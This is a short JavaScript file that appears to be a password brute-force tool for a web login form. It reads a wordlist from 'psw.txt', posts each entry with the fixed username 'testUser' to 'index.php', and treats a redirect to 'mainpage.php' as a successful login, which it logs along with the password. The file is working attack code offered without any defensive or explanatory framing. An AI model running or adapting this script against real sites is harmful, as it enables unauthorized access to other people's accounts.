
function startBrute() {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open('GET', './psw.txt');
    var list = [];
    console.log('STARTING');
    xmlhttp.onreadystatechange = function() {
        // console.log('READYSTATECHANGE');
        if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            var response = xmlhttp.responseText;
            passwords = response.split('\n');
            console.log(passwords);
            for (var i = 0; i < passwords.length; i++) {
                // document.querySelector('.output').innerHTML = 'Trying: '+passwords[i];
                brute(passwords[i]);
            }
            // console.log('Done');
        }
    }
    xmlhttp.send();
}

function brute(psw) {
    var http = new XMLHttpRequest();
    var url = "index.php";
    var params = "uoe=testUser&password="+psw+"";
    // console.log(params);

    http.open("POST", url, true);

    // http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            // alert(http.responseText);
            if (http.response.match(new RegExp('<meta http-equiv="refresh" content="0;URL=\'mainpage.php\'" />'))) {
                console.log("Logged in with:", psw);
                // callback(true);
            } else {
                console.log(false);
                console.log('Not logged in', {r: http.response, password: psw, params: params});
                // callback(false);
            }
            // console.log(http);
        }
    }

    http.send(params);
}
